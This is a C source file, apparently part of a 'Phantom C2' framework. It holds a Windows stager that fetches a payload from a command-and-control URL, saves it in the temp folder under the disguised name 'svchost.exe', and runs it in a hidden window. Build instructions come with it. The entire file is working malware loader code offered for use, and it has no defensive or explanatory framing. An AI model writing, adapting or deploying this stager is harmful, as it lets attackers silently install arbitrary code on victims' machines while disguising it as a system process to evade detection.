// Phantom C2 Windows stager — downloads and runs the full agent.
// Build (from repo root):
//   x86_64-w64-mingw32-gcc -O2 -s -o build/agents/phantom-stager_windows_amd64.exe \
//     -DC2_URL='"http://C2:8080/api/v1/update"' \
//     -DSTAGING_TOKEN='"<token>"' \
//     payloads/stager/windows/stager.c -lwininet
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "wininet.lib")

#ifndef C2_URL
#define C2_URL "http://127.0.0.1:8080/api/v1/update"
#endif

#ifndef STAGING_TOKEN
#define STAGING_TOKEN "change-me"
#endif

int main(void) {
    HINTERNET hInet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                    INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInet) return 1;
    HINTERNET hUrl = InternetOpenUrlA(hInet, C2_URL, NULL, 0,
                                      INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) { InternetCloseHandle(hInet); return 2; }

    char hdr[256];
    wsprintfA(hdr, "X-Client-Token: %s\r\n", STAGING_TOKEN);
    HttpSendRequestA(hUrl, hdr, (DWORD)-1, NULL, 0);

    unsigned char *buf = (unsigned char*)malloc(50 * 1024 * 1024);
    DWORD total = 0, n = 0;
    while (InternetReadFile(hUrl, buf + total, 4096, &n) && n > 0) total += n;

    char path[MAX_PATH];
    GetTempPathA(MAX_PATH, path);
    lstrcatA(path, "svchost.exe");
    FILE *f = fopen(path, "wb");
    if (f) { fwrite(buf, 1, total, f); fclose(f); }

    ShellExecuteA(NULL, "open", path, NULL, NULL, SW_HIDE);

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInet);
    return 0;
}
